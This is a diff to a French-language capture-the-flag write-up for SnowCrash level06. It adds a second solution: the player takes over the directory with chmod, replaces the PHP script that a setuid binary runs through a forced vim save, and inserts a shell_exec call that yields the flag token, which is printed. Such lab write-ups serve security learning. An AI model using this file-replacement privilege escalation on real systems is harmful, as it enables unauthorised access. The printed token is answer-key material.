@@ -71,3 +71,55 @@ level06@SnowCrash:~$ ./level06 /tmp/test
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
  in /home/user/level06/level06.php(4) : regexp code on line 1
 ```
+
+# SOLUTION 2
+
+Le système de fichier se présente de cette manière:
+
+``` bash
+level06@SnowCrash:~$ ls -la
+total 24
+dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
+-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
+-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
+-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
+-r-x------  1 level06 level06  675 Apr  3  2012 .profile
+```
+
+Le fichier `level06.php` appartient au user `flag06` et on a pas les droits d'écriture dessus.
+
+Néanmoins, en faisant `chmod 777 .` on récupère tout les droits sur le dossier courant.
+
+On peut donc modifier ce fichier via `vim` et forcer la sauvegarde avec `:x!` car dans ce cas précis `vim` crée un nouveau fichier, écrit dedans et supprime l'ancien.
+
+```Diff
+level06@SnowCrash:~$ ls -li
+total 12
+11711 -rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
++11713 -rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
+level06@SnowCrash:~$ vim level06.php 
+level06@SnowCrash:~$ ls -li
+total 12
+11711 -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
++13518 -rwxr-x---+ 1 level06 level06   71 Apr 22 14:21 level06.php
+
+```
+
+On voit ci-dessus que `l'inode` du fichier a changé entre avant et après le `vim` (11713 -> 13518), ce n'est donc pas le même fichier mais une copie.
+
+Surtout on voit que le propriétaire du fichier a changé (flag06 -> level06).
+On peut donc écrire ce qu'on veut dedans et notamment:
+
+```php
+$output = shell_exec("getflag");
+echo $output;
+```
+
+Il reste plus qu'à lancer le binaire `level06` qui lui, va lancer `level06.php` avec les drtoits de `flag06`
+
+```
+level06@SnowCrash:~$ ./level06
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+```
